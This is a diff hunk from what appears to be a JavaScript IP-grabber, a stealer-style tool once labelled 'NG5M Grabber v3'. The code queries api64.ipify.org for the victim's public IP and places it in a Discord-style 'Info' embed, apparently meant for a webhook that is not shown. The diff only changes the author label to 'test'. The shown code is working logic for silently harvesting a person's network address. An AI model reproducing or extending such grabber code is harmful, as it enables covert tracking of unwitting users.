@@ -4,9 +4,7 @@ a.open("GET","https://api64.ipify.org");
 a.onreadystatechange = function () {
     if (this.readyState === 4) {
         var embed = {
-            "author":{
-                "name":"NG5M Grabber v3"
-            },
+            "author":"test",
             "title":"**Info**",
             "description":"IP: "+this.responseText,
             "color":parseInt("#FF0000".replace("#",""),16)
